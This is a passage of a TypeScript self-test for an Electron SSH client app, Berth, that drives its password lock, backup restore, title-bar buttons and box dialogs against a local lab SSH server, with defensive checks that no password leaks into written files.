// The skeleton's self-test. It runs inside the real main process, against the real views and engines,
// and only in an unpackaged build started with SSHAPP_SELFTEST=1. It prints one line, "SELFTEST <json>",
// and exits with 0 only if every probe held. The lab (Playwright, real SSH servers, the fault proxy)
// grows out of this; these probes stay as its first cases.
import { app, clipboard, nativeImage, type BaseWindow, type Session, type WebContentsView } from 'electron';
import { spawn, type ChildProcessWithoutNullStreams } from 'node:child_process';
import { createHash, createPublicKey, randomBytes, verify } from 'node:crypto';
import { createServer } from 'node:http';
import type { AddressInfo } from 'node:net';
import os, { availableParallelism } from 'node:os';
import { chmod, mkdtemp, readdir, readFile, rm, stat, writeFile } from 'node:fs/promises';
import path from 'node:path';
import { COPY_MAX, type ShellState } from '../common/ipc';
import { fingerprintOf, type Boxes } from './boxes';
import type { SignAnswer, SignRequest } from './engine';
import type { Gate } from './gate';
import type { KeyProc } from './keyproc';
import type { Tab } from './main';
import { memory } from './memory';
import { BUDGET, type Meter } from './meter';
import { shareFor, type Pace } from './pace';
import { takePicture } from './picture';

interface Ctx {
  gate: Gate;
  keys: KeyProc;
  boxes: Boxes;
  signsRefused(): number;
  signsPassedOn(): number;
  signAs(boxId: string, req: SignRequest): Promise<SignAnswer>;
  listFile: string;
  backups: string;
  shell: WebContentsView;
  shellLoaded: Promise<void>;
  kind: string;
  mode: string;
  meter: Meter;
  win: BaseWindow;
  dist: string;
  harden(ses: Session): void;
  newView(partition: string): WebContentsView;
  openTab(boxId?: string, place?: string): Tab | null;
  closeTab(id: number): void;
  tabs: Map<number, Tab>;
  shellState(): ShellState;
  dropped(): number;
  droppedOn(): Record<string, number>;
  lateFromClosed(): number;
  missing(): Record<string, number>;
  opened(): { url: string; asked: number; refused: number };
  windowAsked(): string[];
  keysRefused(): number;
  overlayOn(): boolean;
  windowInUse(): boolean;
  downloads: string;
  filesAsked(): Record<string, number>;
  chooseToSend(answer: (() => string | string[] | undefined) | null): void;
  stillToSend(tab: number): number;
  watchDrags(watch: ((file: string) => void) | null): void;
  chooseFolder(answer: (() => string | undefined) | null): void;
  settingsNow(): { downloads: string; paneSize: number };
  dragsAsked(): number;
  canDrag(tab: number): number;
  chooseKeyFile(file: string): Promise<void>;
  keyPassphrase(passphrase: string): Promise<void> | undefined;
  pace: Pace;
  forcePace(share: number | null): void;
}

interface Result {
  name: string;
  ok: boolean;
  detail: string;
}

const sleep = (ms: number) => new Promise<void>((r) => setTimeout(r, ms));

// The lab's stand-in for a box (engine/internal/lab/cmd/labbox): a real SSH server on this machine, told what to
// do by lines and answering each with one line of JSON. Only a lab or development run can start it.
class LabBox {
  private readonly lines: string[] = [];
  private buf = '';
  private constructor(private readonly child: ChildProcessWithoutNullStreams) {
    child.stdout.on('data', (chunk: Buffer) => {
      this.buf += chunk.toString('utf8');
      for (let at = this.buf.indexOf('\n'); at >= 0; at = this.buf.indexOf('\n')) {
        this.lines.push(this.buf.slice(0, at));
        this.buf = this.buf.slice(at + 1);
      }
    });
    child.stderr.on('data', () => undefined);
    child.on('error', () => undefined);
  }
  static async start(bin: string): Promise<{ box: LabBox; first: Record<string, unknown> }> {
    const box = new LabBox(spawn(bin, [], { stdio: ['pipe', 'pipe', 'pipe'], env: {}, windowsHide: true }));
    return { box, first: await box.next() };
  }
  private async next(): Promise<Record<string, unknown>> {
    await until(() => this.lines.length > 0, 10_000);
    const line = this.lines.shift();
    return line ? (JSON.parse(line) as Record<string, unknown>) : { error: 'the lab box said nothing' };
  }
  tell(line: string): Promise<Record<string, unknown>> {
    this.child.stdin.write(`${line}\n`);
    return this.next();
  }
  end(): void {
    this.child.stdin.end();
  }
}

// Exactly what the SSH protocol has a client sign for a public-key sign-in (RFC 4252, section 7).
function signInData(user: string, keyLine: string, session = randomBytes(32)): Buffer {
  const s = (b: Buffer | string): Buffer => {
    const body = Buffer.from(b);
    const len = Buffer.alloc(4);
    len.writeUInt32BE(body.length);
    return Buffer.concat([len, body]);
  };
  const blob = Buffer.from(keyLine.split(' ')[1] ?? '', 'base64');
  return Buffer.concat([s(session), Buffer.from([50]), s(user), s('ssh-connection'), s('publickey'), Buffer.from([1]), s('ssh-ed25519'), s(blob)]);
}

// Does this signature, in the protocol's form, verify under this ed25519 key line?
function verifies(keyLine: string, data: Buffer, signatureB64: string): boolean {
  const blob = Buffer.from(keyLine.split(' ')[1] ?? '', 'base64');
  const sig = Buffer.from(signatureB64, 'base64');
  if (blob.length < 32 || sig.length < 64) return false;
  const key = createPublicKey({ key: Buffer.concat([Buffer.from('302a300506032b6570032100', 'hex'), blob.subarray(blob.length - 32)]), format: 'der', type: 'spki' });
  return verify(null, data, key, sig.subarray(sig.length - 64));
}

async function until(what: () => boolean | Promise<boolean>, ms: number, every = 25): Promise<boolean> {
  const end = Date.now() + ms;
  for (;;) {
    if (await what()) return true;
    if (Date.now() > end) return false;
    await sleep(every);
  }
}

const js = <T>(view: WebContentsView, code: string) => view.webContents.executeJavaScript(code, true) as Promise<T>;
const shown = (t: Tab) => js<string>(t.view, `window.berthTerm.text()`);
// Is the tab's page whole: every stylesheet it names loaded with rules in it, the terminal's typeface loaded, and
// the library's own hidden text field hidden (it shows when the library's stylesheet is missing).
interface Dress { sheets: number[]; face: boolean; field: string; }
const dress = (t: Tab) => js<Dress>(t.view, `document.fonts.ready.then(() => ({
  sheets: [...document.querySelectorAll('link[rel=stylesheet]')].map((l) => { try { return l.sheet ? l.sheet.cssRules.length : -1; } catch { return -2; } }),
  face: [...document.fonts].some((f) => f.family.replace(/['"]/g, '') === 'Plex Mono' && f.status === 'loaded'),
  field: (() => { const f = document.querySelector('.xterm-helper-textarea'); return f ? getComputedStyle(f).opacity + ' ' + getComputedStyle(f).position : 'none'; })(),
}))`);
const dressed = (d: Dress) => d.sheets.length >= 3 && d.sheets.every((n) => n > 0) && d.face && d.field === '0 absolute';
const type = (t: Tab, text: string) => js<void>(t.view, `window.tabPort.send(new TextEncoder().encode(${JSON.stringify(text)}))`);
// Signals go to one real process only. A pid of 0 would mean "every process in our group", main included:
// an engine that never started has no pid, and must never be signalled.
const signal = (pid: number, sig: NodeJS.Signals): boolean => {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  try {
    process.kill(pid, sig);
    return true;
  } catch {
    return false;
  }
};
const alive = (pid: number) => {
  if (!Number.isInteger(pid) || pid <= 1) return false;
  try {
    process.kill(pid, 0);
    return true;
  } catch {
    return false;
  }
};

export async function runSelfTest(ctx: Ctx): Promise<void> {
  const results: Result[] = [];
  let stage = 'starting';
  const check = (name: string, ok: boolean, detail: unknown = '') => {
    stage = `after "${name}"`;
    // What a probe says about a failure is for a person to read, so it is bounded: one probe that happened to
    // hold a whole file would otherwise make a result line nothing downstream could carry.
    const said = typeof detail === 'string' ? detail : JSON.stringify(detail);
    results.push({ name, ok, detail: said.length > 1500 ? `${said.slice(0, 1500)}... (${said.length} characters in all)` : said });
  };
  const finish = (asked: number) => {
    // Every mode ends here, so every mode is held to this: a page that asked for a file the app does not hold
    // was running without a part of itself.
    check('no page of the app asked for a file the app does not hold', Object.keys(ctx.missing()).length === 0, ctx.missing());
    const code = asked === 0 && results.every((r) => r.ok) ? 0 : 1;
    process.stdout.write(`SELFTEST ${JSON.stringify({ ok: code === 0, kind: ctx.kind, results })}\n`);
    app.exit(code);
  };
  // The one thing this guard is for is a hang: a run that stops answering, with nothing to show for it. How
  // fast the app is has its own budgets, measured and reported separately (B8), so this ceiling is generous
  // on purpose and rises with the number of things the lab tries, rather than quietly cutting them. On a slow
  // test machine it is multiplied by the stated factor, as every other budget is.
  const wholeRunMs = 300_000 * Math.max(1, Number(process.env['SSHAPP_BUDGET_FACTOR']) || 1);
  const guard = setTimeout(() => {
    check('finished in time', false, `no end within ${Math.round(wholeRunMs / 1000)} s; stuck ${stage}`);
    finish(1);
  }, wholeRunMs);

  // A canary: a web server on this machine that must never hear from a view. It exists only during this
  // test, in an unpackaged build; the app itself never listens on any port.
  let canaryHits = 0;
  const canary = createServer((_req, res) => {
    canaryHits++;
    res.end('reached');
  });
  await new Promise<void>((r) => canary.listen(0, '127.0.0.1', r));
  const web = `http://127.0.0.1:${(canary.address() as AddressInfo).port}`;

  try {
    stage = 'loading the shell view';
    await ctx.shellLoaded;
    check('the shell view loads', true);

    // ---- The lock. Every run begins here, as the app does: nothing works before the password. ----
    // The lab's password carries a marker, so that every file the app wrote can be searched for it afterwards.
    const PASSWORD = 'berth-lab-canary-7f3a91 password';
    const phase = () => ctx.gate.state.phase;
    const sh = ctx.shell.webContents;
    const at = (sel: string, on: Tab | null = null) => js<{ x: number; y: number } | null>(on ? on.view : ctx.shell, `(() => { const b = document.querySelector(${JSON.stringify(sel)}); if (!b) return null; const r = b.getBoundingClientRect(); return { x: Math.round(r.x + r.width / 2), y: Math.round(r.y + r.height / 2) }; })()`);
    const clickOn = async (sel: string, on: Tab | null = null) => {
      const p = await at(sel, on);
      if (!p) return false;
      // A tab's view draws where it sits in the window, but is clicked in its own, so the point is its own.
      const w = on ? on.view.webContents : sh;
      w.sendInputEvent({ type: 'mouseDown', x: p.x, y: p.y, button: 'left', clickCount: 1 });
      w.sendInputEvent({ type: 'mouseUp', x: p.x, y: p.y, button: 'left', clickCount: 1 });
      await sleep(60);
      return true;
    };
    // Real keys, one character at a time, into whatever has the focus.
    const typeKeys = async (text: string) => {
      for (const ch of text) sh.sendInputEvent({ type: 'char', keyCode: ch });
      await sleep(120);
    };
    const pressEnter = async () => {
      sh.sendInputEvent({ type: 'keyDown', keyCode: 'Enter' });
      sh.sendInputEvent({ type: 'keyUp', keyCode: 'Enter' });
      await sleep(60);
    };
    const text = (sel: string, on: Tab | null = null) => js<string>(on ? on.view : ctx.shell, `document.querySelector(${JSON.stringify(sel)})?.textContent ?? ''`);
    const has = (sel: string, on: Tab | null = null) => js<boolean>(on ? on.view : ctx.shell, `!!document.querySelector(${JSON.stringify(sel)})`);
    // Every file under the lab's folders: none may hold the password.
    const filesHolding = async (needle: string): Promise<string[]> => {
      const found: string[] = [];
      const walk = async (dir: string): Promise<void> => {
        for (const e of await readdir(dir, { withFileTypes: true }).catch(() => [])) {
          const p = path.join(dir, e.name);
          if (e.isDirectory()) await walk(p);
          else if (e.isFile() && (await stat(p)).size < 64 * 1024 * 1024 && (await readFile(p).catch(() => Buffer.alloc(0))).includes(needle)) found.push(p);
        }
      };
      await walk(path.dirname(path.dirname(ctx.listFile)));
      return found;
    };
    let refusedByTheLock = 0;
    const lockHolds = async (what: string) => {
      refusedByTheLock++;
      const before = ctx.dropped();
      await js(ctx.shell, `window.shellPort.cmd({ op: 'new' })`);
      await sleep(250);
      check(`${what}: a tab cannot be opened`, ctx.tabs.size === 0 && ctx.dropped() === before + 1, [ctx.tabs.size, ctx.dropped() - before]);
    };

    if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused') {
      stage = 'the lock';
      await until(() => phase() !== 'starting', 20_000);
    }

    if (ctx.mode === 'all') {
      // The first start, through the real screen with real keys.
      check('first start: the lock asks to make a password', phase() === 'create' && (await until(() => has('#gate-create'), 5000)) && !(await has('#bar')), phase());
      // Windows draws no title bar for Berth, so the screens before the lock carry the window's own buttons
      // themselves. Without them this screen could not be put away or moved with the mouse at all.
      check('the screens before the lock carry the window\'s own buttons', (await has('#win-strip')) && (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), '');
      // And the same status line the window has. These screens had none at all, so the app's one place for
      // saying where things stand vanished on them (the owner, 2026-11-17: "no real thin footer everywhere").
      check('the screens before the lock carry the status line too', (await has('#gate-status')) && (await text('#gate-status')).includes('Berth') && (await text('#gate-status-where')) === 'First start', await text('#gate-status'));
      await lockHolds('before any password');
      // Pressing with nothing typed: it must say what is in the way and put the cursor where it is. Before, the
      // press did nothing whatever, on the first screen anyone sees.
      await clickOn('#gate-submit');
      check('the first press with nothing typed says what is in the way', await until(async () => (await text('#gate-to-fix')).includes('A password is needed'), 2000), await text('#gate-to-fix'));
      check('and puts the cursor in the password field', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'pw-one', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
      await clickOn('#pw-one');
      await typeKeys('too short');
      const shortSaid = await text('#pw-one-check');
      await pressEnter();
      await sleep(300);
      check('a password of 9 characters is said to be short, and Enter does nothing', shortSaid.includes('9 of 12') && phase() === 'create', [shortSaid, phase()]);
      await js(ctx.shell, `document.querySelector('#pw-one').select()`);
      await typeKeys(PASSWORD);
      await clickOn('#pw-two');
      await typeKeys(PASSWORD.slice(0, -1));
      const differs = await text('#pw-two-check');
      await typeKeys(PASSWORD.slice(-1));
      const same = await text('#pw-two-check');
      check('typed twice: a difference is said, and so is a match', differs.includes('not the same') && same.includes('the same as above'), [differs, same]);
      check('the backup folder is checked before it is used', (await text('#backup-check')).includes('writable') && (await text('#backup-dir')) === ctx.backups, await text('#backup-check'));
      await pressEnter();
      check('the password makes the list and unlocks', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('the window is the app now, and no password field is left', (await until(() => has('#bar'), 5000)) && !(await has('input')), '');
      const list = await readFile(ctx.listFile).catch(() => Buffer.alloc(0));
      const backup = await readFile(path.join(ctx.backups, 'Berth list backup.berth')).catch(() => Buffer.alloc(1));
      check('the list is on disk, sealed, and its backup is the same file', list.subarray(0, 8).toString() === 'BERTHVLT' && list.equals(backup) && ctx.gate.backup === 'written', [list.length, backup.length, ctx.gate.backup]);
      const holding = await filesHolding(PASSWORD);
      check('no file the app wrote holds the password', holding.length === 0, holding);
    } else if (ctx.mode === 'gate-unlock') {
      // A later start, on a profile that already has a list: wrong password, the wait, then the right one.
      check('a later start: the lock asks for the password and shows nothing else', phase() === 'locked' && (await until(() => has('#gate-unlock'), 5000)) && !(await has('#bar')) && !(await has('#gate-create')), phase());
      await lockHolds('before the password');
      await clickOn('#pw');
      await typeKeys('not the password, sorry');
      await pressEnter();
      const wrong = await until(() => ctx.gate.state.wrong && phase() === 'locked', 30_000);
      check('a wrong password is said plainly, and the next try must wait', wrong && (await until(async () => (await text('#gate-wrong')).includes('Wrong password') && (await text('#gate-submit')).includes('Wait'), 3000)) && ctx.gate.view().waitMs > 0, [phase(), await text('#gate-submit'), ctx.gate.view().waitMs]);
      await lockHolds('after a wrong password');
      await typeKeys(PASSWORD);
      await pressEnter(); // during the wait: not sent, not looked at
      await sleep(200);
      check('the right password during the wait is not looked at', phase() === 'locked', phase());
      await until(async () => (await text('#gate-submit')).trim() === 'Unlock', 5000);
      await pressEnter();
      // The window's own three buttons, before the lock opens: Windows draws no title bar for Berth, so if these
      // were not here a person could not put the password screen away or move it with the mouse at all.
      check('the lock screen carries the window\'s own buttons', (await has('#win-strip')) && (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), await text('#win-strip'));
      check('after the wait the right password unlocks', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('the window is the app now', await until(() => has('#bar'), 5000), '');

      // What the first start left in the list is there again: the box, pinned, with its key in the key process.
      if (process.env['SSHAPP_LABBOX']) {
        const kept = ctx.boxes.list;
        const heldNow = await ctx.keys.request('keys');
        check('the boxes are back as they were saved: one box, pinned, with its own key', ctx.boxes.loaded && ctx.boxes.fault === '' && kept.length === 1 && kept[0]!.name === 'lab-box' && kept[0]!.pin !== '' && kept[0]!.places[0]?.name === 'logs' && Array.isArray(heldNow['keys']) && (heldNow['keys'] as Record<string, unknown>[]).length === 1 && (heldNow['keys'] as Record<string, unknown>[])[0]!['publicKey'] === kept[0]!.publicKey, [ctx.boxes.fault, kept.map((b) => [b.name, b.pin !== ''])]);
      }
      // And it is on the screen, not only in main: a list loaded after the window was already drawn, with
      // nothing to redraw it, would leave the app looking like a first start with every box still saved.
      if (process.env['SSHAPP_LABBOX']) {
        const onScreenNow = await text('#bar');
        await clickOn('#boxes');
        await sleep(300);
        const menu = await text('#box-menu');
        check('the window shows the saved box, not an empty first start', menu.includes('lab-box') && !onScreenNow.includes('Add box is the only'), [menu.slice(0, 120), onScreenNow.slice(0, 80)]);
        await clickOn('#boxes');
      }
      const holding = await filesHolding(PASSWORD);
      check('no file the app wrote holds the password, or the wrong one', holding.length === 0 && (await filesHolding('not the password, sorry')).length === 0, holding);

      // A stalled main cannot report itself. The key process times main's beat, so it is the one part that
      // can say main stopped (plan B1, B8 rule 5). Main is stopped here on purpose, which is the only place
      // in this app where anything blocks it; the check that forbids blocking calls covers the app's code.
      const beforeStall = await ctx.keys.request('status');
      const stallFor = 6500;
      const stallUntil = Date.now() + stallFor;
      while (Date.now() < stallUntil) {
        // nothing: main is held here, as a frozen main would be
      }
      const afterStall = await ctx.keys.request('status');
      const stalls = Number(afterStall['mainStalls'] ?? -1);
      const longest = Number(afterStall['mainLongestStallMs'] ?? -1);
      check('the key process saw main stop, and says how long for', Number(beforeStall['mainStalls'] ?? -1) === 0 && stalls === 1 && longest >= stallFor - 500 && longest < stallFor + 4000, [beforeStall['mainStalls'], stalls, longest]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode === 'gate-restore') {
      // A list that cannot be read, and the way back: the copy saved beside it. The list was damaged by the
      // smoke run before this start, so this is the real screen the real fault brings up.
      // The damage is in the sealed contents, so it is found when the password is tried, not before: the lock
      // asks as it always does, and only then can it tell a damaged list from a wrong password.
      check('a start on a damaged list asks for the password as usual', phase() === 'locked' && (await until(() => has('#gate-unlock'), 10_000)), phase());
      await clickOn('#pw');
      await typeKeys(PASSWORD);
      await pressEnter();
      check('the right password on a damaged list: it is called damaged, not wrong, and no wait is started', (await until(() => phase() === 'damaged', 30_000)) && !ctx.gate.state.wrong && ctx.gate.view().waitMs === 0, [phase(), ctx.gate.state.wrong, ctx.gate.view().waitMs]);
      check('a damaged list: the lock says so, asks for no password, and offers the ways back', (await until(() => has('#gate-damaged'), 5000)) && !(await has('#pw')) && (await has('#gate-previous')) && (await has('#gate-pick-restore')) && ctx.gate.state.hasPrevious, [phase(), ctx.gate.state.detail]);
      check('and it says which fault it is, in words, and that nothing was changed', (await text('#gate-damaged-said')).includes('damaged or was altered') && (await text('#gate-damaged-said')).includes('It was not changed'), await text('#gate-damaged-said'));
      const shots = process.env['SSHAPP_PICTURES'] ?? '';
      if (shots) {
        await js<string>(ctx.shell, `document.fonts.ready.then(() => 'ok')`);
        await sleep(400);
        const size = ctx.win.getContentBounds();
        const made = await takePicture({ win: ctx.win, views: [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-list-damaged.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   a list that cannot be read, and the ways back   |   commit ${process.env['SSHAPP_PICTURE_COMMIT'] ?? ''}`, dist: ctx.dist, harden: ctx.harden });
        check('a picture: a list that cannot be read', made.width > 0, made);
      }
      // A view may type a password; it may not say which file to open. The file is main's own, from the
      // system's chooser or the copy beside the list (plan B2.7).
      const beforeTry = { detail: ctx.gate.state.detail, dropped: ctx.dropped() };
      await js(ctx.shell, `window.shellPort.gateRestore(new TextEncoder().encode('anything at all'))`);
      await sleep(300);
      check('a view cannot open a backup main did not choose: the message is dropped, nothing is tried, nothing is said', phase() === 'damaged' && !ctx.gate.unlocked && ctx.gate.state.restoreFrom === '' && ctx.gate.state.detail === beforeTry.detail && !ctx.gate.state.wrong && ctx.dropped() === beforeTry.dropped + 1, [phase(), ctx.gate.state.detail, ctx.gate.state.wrong, ctx.dropped() - beforeTry.dropped]);
      await clickOn('#gate-previous');
      check('the copy saved before this one can be chosen, and it is named without a path', (await until(() => ctx.gate.state.restoreFrom !== '', 3000)) && (await text('#gate-restore-from')).includes('The copy saved before this one') && (await has('#pw-restore')), [ctx.gate.state.restoreFrom, await text('#gate-restore-from')]);
      await clickOn('#pw-restore');
      await typeKeys('not the password');
      await clickOn('#gate-restore');
      check('a wrong password for the backup is said, and the list is still not open', (await until(() => ctx.gate.state.wrong && phase() === 'damaged', 30_000)) && !ctx.gate.unlocked, [phase(), ctx.gate.state.wrong]);
      // And the wait that comes with it is said on the button, as on the unlock screen: a press inside the
      // wait must never be a press that quietly did nothing.
      check('the wait is counted down on the button', ctx.gate.view().waitMs > 0 && (await until(async () => (await text('#gate-restore')).includes('Wait'), 3000)), [ctx.gate.view().waitMs, await text('#gate-restore')]);
      // The screen holds the button back during the wait; main holds the wait itself, so a view that asks
      // anyway is not looked at either. A try that was looked at would come back wrong and double the wait.
      const waiting = ctx.gate.view().waitMs;
      await js(ctx.shell, `window.shellPort.gateRestore(new TextEncoder().encode('guessing inside the wait'))`);
      await sleep(250);
      check('a password sent inside the wait is not looked at, and does not lengthen the wait', phase() === 'damaged' && ctx.gate.view().waitMs > 0 && ctx.gate.view().waitMs <= waiting, [waiting, ctx.gate.view().waitMs, phase()]);
      await until(() => ctx.gate.view().waitMs === 0, 40_000);
      await js(ctx.shell, `(() => { const f = document.querySelector('#pw-restore'); f.focus(); f.select(); })()`);
      await typeKeys(PASSWORD);
      const typed = await js<number>(ctx.shell, `document.querySelector('#pw-restore').value.length`);
      check('the password is typed into the field, not somewhere else', typed === PASSWORD.length, [typed, PASSWORD.length]);
      await pressEnter();
      check('the right password opens the backup, and it becomes the list', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      check('and the boxes are back, each with its own key', await until(() => ctx.boxes.loaded && ctx.boxes.fault === '' && ctx.boxes.list.length > 0, 5000), [ctx.boxes.fault, ctx.boxes.list.map((b) => b.name)]);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode === 'gate-shot') {
      // A picture of the lock as it is, for comparing with the approved one. SSHAPP_GATE_TYPED fills its fields.
      const typed = process.env['SSHAPP_GATE_TYPED'] ?? '';
      await until(async () => (await has('#gate-create')) || (await has('#gate-unlock')) || (await has('#gate-notice')), 5000);
      if (typed && phase() === 'create') {
        await clickOn('#pw-one');
        await typeKeys(typed);
        await clickOn('#pw-two');
        await typeKeys(typed);
      } else if (typed) {
        await clickOn('#pw');
        await typeKeys(typed);
        if (process.env['SSHAPP_GATE_ENTER']) {
          await pressEnter();
          await until(() => ctx.gate.state.wrong, 30_000);
          await sleep(300);
        }
      }
      await js<string>(ctx.shell, `document.fonts.ready.then(() => 'ok')`);
      await sleep(400);
      const file = process.env['SSHAPP_PICTURE'] ?? '';
      const made = await takePicture({ win: ctx.win, views: [ctx.shell], file, strip: process.env['SSHAPP_PICTURE_STRIP'] ?? '', dist: ctx.dist, harden: ctx.harden });
      check(`a picture of the lock (${phase()}): ${made.width} x ${made.height}`, file !== '', made);
      canary.close();
      clearTimeout(guard);
      return finish(results.every((r) => r.ok) ? 0 : 1);
    } else if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused') {
      // The other modes are about what comes after the lock: they pass it the short way, with the same password.
      if (phase() === 'create') await ctx.gate.create(Buffer.from(PASSWORD));
      else await ctx.gate.unlock(Buffer.from(PASSWORD));
      check('unlocked', await until(() => phase() === 'unlocked', 30_000), [phase(), ctx.gate.state.detail]);
      await until(() => has('#bar'), 5000);
    }

    // The bar is Berth's title bar: Windows draws none. Its own surface drags the window, what can be pressed
    // in it is pressed and not dragged, and the window's three buttons are at its end and do what they say.
    if (ctx.mode !== 'direction' && ctx.mode !== 'engine-must-be-refused' && (await has('#bar'))) {
      stage = 'the title bar';
      const region = (id: string) => js<string>(ctx.shell, `(getComputedStyle(document.getElementById(${JSON.stringify(id)}))['-webkit-app-region'] ?? getComputedStyle(document.getElementById(${JSON.stringify(id)})).getPropertyValue('-webkit-app-region') ?? '').trim()`);
      const maxBtn = () => js<string>(ctx.shell, `document.getElementById('win-max')?.getAttribute('aria-label') ?? ''`);
      check('the bar carries the window\'s own three buttons', (await has('#win-min')) && (await has('#win-max')) && (await has('#win-close')), '');
      check('and the bar is the title bar: its own surface drags the window', (await region('bar')) === 'drag', await region('bar'));
      check('a button in the bar is pressed, not dragged', (await region('boxes')) === 'no-drag', await region('boxes'));
      const wasMax = ctx.win.isMaximized();
      check('the maximize button offers what the window is not already', (await maxBtn()) === (wasMax ? 'Restore' : 'Maximize'), [await maxBtn(), wasMax]);

      // Whether a window can be maximized at all is the screen's to decide, not Berth's: the test screen the
      // lab runs on under Linux has no window manager, so nothing there maximizes. What is Berth's own, and is
      // checked here wherever the lab runs, is that pressing the button asks the window for the right thing.
      const askedBefore = ctx.windowAsked().length;
      await clickOn('#win-max');
      const asked = await until(() => ctx.windowAsked().length > askedBefore, 4000);
      check('pressing the maximize button asks the window to maximize', asked && ctx.windowAsked()[askedBefore] === 'maximize', ctx.windowAsked());

      // And where the screen does maximize, the window moves and the button turns round with it. Where it does
      // not, that is said here rather than passed over in silence.
      ctx.win.maximize();
      const screenMaximizes = await until(() => ctx.win.isMaximized(), 2000);
      if (!screenMaximizes) {
        check('this screen maximizes no window, so the window moving is not checked here (it is on Windows)', true, 'no window manager');
      } else {
        check('the button turns round when the window is maximized', await until(async () => (await maxBtn()) === 'Restore', 4000), await maxBtn());
        ctx.win.unmaximize();
        check('and back again when it is put back', await until(async () => (await maxBtn()) === 'Maximize', 4000), await maxBtn());
      }
      // Put back as it was, so what follows is measured in the window the rest of the run expects.
      if (wasMax) ctx.win.maximize();
      else ctx.win.unmaximize();
      await until(() => ctx.win.isMaximized() === wasMax, 4000);
    }

    // "boxes-ui": the box screens driven by hand, as they will be used: real clicks and keys into the real
    // dialogs, against the lab's SSH server. SSHAPP_PICTURES=<folder> also pictures each screen on the way.
    if (ctx.mode === 'boxes-ui') {
      const labBin = process.env['SSHAPP_LABBOX'] ?? '';
      const shots = process.env['SSHAPP_PICTURES'] ?? '';
      const commit = process.env['SSHAPP_PICTURE_COMMIT'] ?? '';
      const size = ctx.win.getContentBounds();
      const shot = async (name: string, what: string, bring: Tab | null = null) => {
        if (!shots) return;
        if (bring && ctx.shellState().active !== bring.id) {
          await js(ctx.shell, `window.shellPort.cmd({ op: 'select', id: ${bring.id} })`);
          await sleep(200);
        }
        await sleep(350);
        const front = [...ctx.tabs.values()].find((t) => t.id === ctx.shellState().active);
        const made = await takePicture({ win: ctx.win, views: front ? [front.view, ctx.shell] : [ctx.shell], file: path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`), strip: `Berth, the app as built   |   dark   |   window ${size.width}x${size.height}   |   ${what}   |   commit ${commit}`, dist: ctx.dist, harden: ctx.harden });
        check(`a picture: ${what}`, made.width > 0, made);
        if (name === 'tab-open') {
          // The picture is the window: in its middle is the tab's terminal, seen through the shell that lies
          // over it. (Until 2026-11-16 the pictures showed black there, and nothing noticed.)
          const png = nativeImage.createFromBuffer(await readFile(path.join(shots, `berth-app-dark-${size.width}x${size.height}-${name}.png`)));
          const at = (Math.floor(png.getSize().height / 2) * png.getSize().width + Math.floor(png.getSize().width / 2)) * 4;
          const px = [...png.toBitmap().subarray(at, at + 3)].reverse().map((v) => v.toString(16).padStart(2, '0')).join('');
          check('the picture shows the tab through the shell: its middle is the terminal\'s own colour', px === '141b21', px);
        }
      };
      const shellOnTop = () => {
        const kids = ctx.win.contentView.children;
        return kids[kids.length - 1] === ctx.shell;
      };
      const moveTo = async (sel: string) => {
        const p = await at(sel);
        if (p) sh.sendInputEvent({ type: 'mouseMove', x: p.x, y: p.y });
        await sleep(120);
        return !!p;
      };
      const selectAll = async () => {
        sh.sendInputEvent({ type: 'keyDown', keyCode: 'A', modifiers: ['control'] });
        sh.sendInputEvent({ type: 'keyUp', keyCode: 'A', modifiers: ['control'] });
        await sleep(60);
      };
      const step = () => js<string>(ctx.shell, `document.getElementById('check')?.dataset.step ?? ''`);
      if (labBin === '') {
        check('a lab box to connect to', false, 'SSHAPP_LABBOX is not set');
      } else {
        const { box: lab, first } = await LabBox.start(labBin);
        const addr = String(first['addr'] ?? '');
        const port = addr.split(':')[1] ?? '';
        const printed = String(first['printed'] ?? '');

        check('a first start with no box shows one thing: Add box', await until(() => has('#first-add'), 5000), '');
        await shot('first-use', 'a first start: no box yet');
        await clickOn('#first-add');
        check('Add box opens, with the shell above the tabs', (await until(() => has('#add-box'), 3000)) && (await until(shellOnTop, 1000)), '');
        // A dialog dims the window behind it but must leave the status line alone: that line is where the app
        // says what it just did, and a dialog is exactly when it is needed. Under the dim it could not be read.
        const overFoot = await js<boolean>(ctx.shell, `(() => { const s = document.querySelector('.scrim'); const f = document.getElementById('status'); if (!s || !f) return true; return Math.round(s.getBoundingClientRect().bottom) > Math.round(f.getBoundingClientRect().top); })()`);
        check('a dialog leaves the status line clear of its dim', !overFoot, overFoot);
        await shot('add-empty', 'Add box, empty');
        // Add with nothing typed: every required field says so, and nothing is asked of main.
        await clickOn('#add-submit');
        check('Add with nothing typed: the first field to fix is named, with how many there are', (await text('#add-to-fix')).includes('Name: needed') && (await text('#add-to-fix')).includes('3 fields to fix') && (await text('#box-name-check')) === 'needed' && ctx.boxes.list.length === 0, await text('#add-to-fix'));
        // A press that is refused must move something, or there is no telling it landed at all. The cursor goes
        // into the first field that needs attention: this is what cost the owner his host field on the first install.
        check('and the cursor is put in the first field to fix, not left where it was', (await js<string>(ctx.shell, `document.activeElement?.id ?? ''`)) === 'box-name', await js<string>(ctx.shell, `document.activeElement?.id ?? ''`));
        // The same with only one field left: the one named is the one still wrong, and the cursor goes to it.
        await clickOn('#box-name');
        await typeKeys('for-a-moment');
        await clickOn('#box-host');
        await typeKeys('127.0.0.1');
        await clickOn('#add-submit');
